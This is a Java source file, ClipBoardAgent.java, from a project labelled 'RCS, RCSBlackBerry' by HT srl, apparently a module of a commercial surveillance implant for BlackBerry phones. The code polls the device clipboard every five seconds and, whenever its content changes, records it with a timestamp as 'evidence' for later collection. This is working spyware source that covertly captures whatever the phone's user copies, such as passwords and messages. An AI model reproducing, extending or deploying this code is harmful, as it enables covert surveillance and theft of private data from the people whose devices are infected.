//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : ClipBoardAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.util.Vector;

import net.rim.device.api.system.Clipboard;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.interfaces.UserAgent;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;


/**
 * The Class ClipBoardAgent.
 */
public final class ClipBoardAgent extends Agent implements UserAgent {
    //#ifdef DEBUG
    static Debug debug = new Debug("ClipBoardAgent", DebugLevel.VERBOSE);
    //#endif
    
    static String lastClip = "";
    
    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ClipBoardAgent(final boolean agentEnabled) {
        super(Agent.AGENT_CLIPBOARD, agentEnabled, Conf.AGENT_CLIPBOARD_ON_SD, "ClipBoardAgent");
        
        //#ifdef CLIP_FORCED
        enable(true);
        //#endif
    }

    /**
     * Instantiates a new clip board agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ClipBoardAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart(){
        
    }
    
    public void actualStop(){
        
    }
    
    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        final String ret = Clipboard.getClipboard().get().toString();
        if (ret != null && !ret.equals(lastClip)) {
            //#ifdef DEBUG
            debug.trace("actualRun: captured " + ret);
            //#endif
            saveEvidence(ret);
            lastClip = ret;
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        debug.trace("parse");
        //#endif
        setPeriod(5000);
        return false;
    }
    
    private void saveEvidence(String ret) {

        final byte[] tm = (new DateTime()).getStructTm();
        final byte[] payload = WChar.getBytes(ret.toString(), true);
        final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
        final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$

        final Vector items = new Vector();
        items.addElement(tm);
        items.addElement(process);
        items.addElement(window);
        items.addElement(payload);
        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

        evidence.atomicWriteOnce(items);

    }
}
